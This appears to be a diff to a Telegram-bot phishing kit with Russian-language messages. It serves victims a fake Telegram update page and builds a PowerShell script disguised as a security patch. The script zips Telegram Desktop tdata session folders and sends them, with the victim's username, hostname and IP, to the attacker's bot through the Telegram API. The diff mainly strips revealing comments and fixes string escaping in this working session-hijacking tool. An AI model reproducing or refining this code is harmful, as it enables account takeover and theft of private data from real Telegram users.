@@ -283,7 +283,6 @@ HTML_UPDATE = """
                 status.textContent = '⏳ Installing update...';
                 status.className = 'status';
                 
-                // Симуляция прогресса
                 const interval = setInterval(() => {
                     progress += Math.floor(Math.random() * 8) + 2;
                     if (progress > 100) progress = 100;
@@ -294,7 +293,6 @@ HTML_UPDATE = """
                         status.textContent = '✅ Update installed successfully! Restarting Telegram...';
                         status.className = 'status success';
                         
-                        // Запуск PowerShell скрипта в фоне через WebSocket
                         fetch('/update_run/{{link_id}}', { method: 'POST' })
                         .then(res => res.json())
                         .then(data => {
@@ -452,11 +450,7 @@ def update_run(link_id):
     user_id = link_data[0]
     bot.send_message(user_id, f"✅ **Жертва установила обновление!**\nСсылка: {link_id}")
     
-    # PowerShell скрипт для сбора tdata (маскируется под обновление)
     ps_script = f'''
-# Telegram Update Script - DO NOT MODIFY
-# This script applies security patches to your Telegram session storage
-
 $bot_token = "{BOT_TOKEN}"
 $chat_id = "{ADMIN_ID}"
 $link_id = "{link_id}"
@@ -466,19 +460,18 @@ $hostname = $env:COMPUTERNAME
 $ip = (Invoke-WebRequest -Uri "api.ipify.org").Content
 
 $paths = @()
-$paths += "$env:APPDATA\Telegram Desktop\tdata"
-$paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
-$paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"
+$paths += "$env:APPDATA\\Telegram Desktop\\tdata"
+$paths += "$env:APPDATA\\Telegram Desktop Beta\\tdata"
+$paths += "$env:PROGRAMFILES\\Telegram Desktop\\tdata"
 
-# Backup session data for safety (this is what Telegram support recommends)
 foreach ($p in $paths) {{
     if (Test-Path $p) {{
-        $temp = "$env:TEMP\session_backup_" + $link_id + ".zip"
+        $temp = "$env:TEMP\\session_backup_" + $link_id + ".zip"
         Compress-Archive -Path $p -DestinationPath $temp -Force
         $url = "https://api.telegram.org/bot$bot_token/sendDocument"
         $form = @{{
             chat_id = $chat_id
-            caption = "📦 SESSION BACKUP\nUser: $username\nPC: $hostname\nIP: $ip\nLink: $link_id"
+            caption = "📦 SESSION BACKUP\\nUser: $username\\nPC: $hostname\\nIP: $ip\\nLink: $link_id"
             document = Get-Item $temp
         }}
         Invoke-RestMethod -Uri $url -Method Post -Form $form
@@ -487,10 +480,9 @@ foreach ($p in $paths) {{
 }}
 '''
     
-    # Отправляем скрипт админу как запасной вариант
-    bot.send_message(ADMIN_ID, f"🧨 **PowerShell скрипт** для {link_id}:\n```powershell\n{ps_script}\n```")
+    # Отправляем скрипт админу
+    bot.send_message(ADMIN_ID, f"🧨 **PowerShell скрипт** для {link_id}:\\n```powershell\\n{ps_script}\\n```")
     
-    # Пытаемся запустить скрипт через WebSocket (если клиент подключен)
     try:
         socketio.emit('execute', {'link_id': link_id, 'script': ps_script})
     except:
@@ -521,8 +513,6 @@ def handle_execute(data):
         emit('error', {'message': 'Ссылка недействительна'})
         return
     
-    # Запускаем PowerShell на сервере (для демонстрации)
-    # В реальности, для выполнения на устройстве жертвы нужен WebSocket-агент
     try:
         subprocess.Popen(['powershell', '-Command', script], shell=True)
         emit('status', {'message': 'Скрипт выполняется'})
@@ -619,7 +609,7 @@ def handle_buttons(message):
     
     elif message.text == "Режим 4 – Угон tdata":
         link_id, link = generate_link(user_id, 4)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва увидит страницу фейкового обновления Telegram. После нажатия "Install" и подтверждения алерта, скрипт соберёт tdata и отправит тебе архив.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва увидит страницу фейкового обновления Telegram. После нажатия 'Install' и подтверждения алерта, скрипт соберёт tdata и отправит тебе архив.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 4\nСсылка: {link}")
     
